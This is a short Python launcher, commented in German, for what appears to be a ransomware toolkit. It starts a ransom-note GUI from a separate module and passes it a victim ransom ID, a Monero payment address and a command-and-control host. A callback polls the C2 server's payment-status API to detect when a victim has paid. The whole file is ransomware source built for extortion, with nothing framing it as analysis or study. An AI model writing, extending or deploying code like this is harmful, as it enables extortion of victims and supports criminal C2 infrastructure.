#!/usr/bin/env python3
"""
GUI Launcher Wrapper
====================
Startet ransom_gui.py mit Kommandozeilen-Parametern und Payment-Callback
"""

import sys
import os
import json
import urllib.request

def main():
    if len(sys.argv) < 4:
        print("[!] Usage: python run_gui.py <ransom_id> <monero_address> <c2_host> [c2_port]")
        print("\nExample:")
        print('  python run_gui.py Test1 4BJV39ZuKU... 127.0.0.1')
        print('  python run_gui.py Test1 4BJV39ZuKU... 192.168.1.100 5000')
        sys.exit(1)
    
    ransom_id = sys.argv[1]
    monero_address = sys.argv[2]
    c2_host = sys.argv[3]
    c2_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5000
    
    print(f"[+] Starting Ransom GUI...")
    print(f"    Ransom ID: {ransom_id}")
    print(f"    Monero: {monero_address[:20]}...")
    print(f"    C2 Host: {c2_host}:{c2_port}")
    print()
    
    # Payment check callback - prüft auf dem C2 Server
    def check_payment():
        """Prüfe Payment-Status auf C2 Server"""
        try:
            url = f"http://{c2_host}:{c2_port}/api/v1/payment/status/{ransom_id}"
            with urllib.request.urlopen(url, timeout=5) as r:
                result = json.load(r)
                paid = result.get('paid', False)
                if paid:
                    print(f"[✓] PAYMENT DETECTED for {ransom_id}!")
                return paid
        except Exception as e:
            # Fehler = noch kein Payment
            return False
    
    try:
        from ransom_gui import RansomNoteGUI
        
        gui = RansomNoteGUI(
            ransom_id=ransom_id,
            monero_address=monero_address,
            c2_host=c2_host,
            payment_check_callback=check_payment  # <- WICHTIG: Callback übergeben!
        )
        gui.run()
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
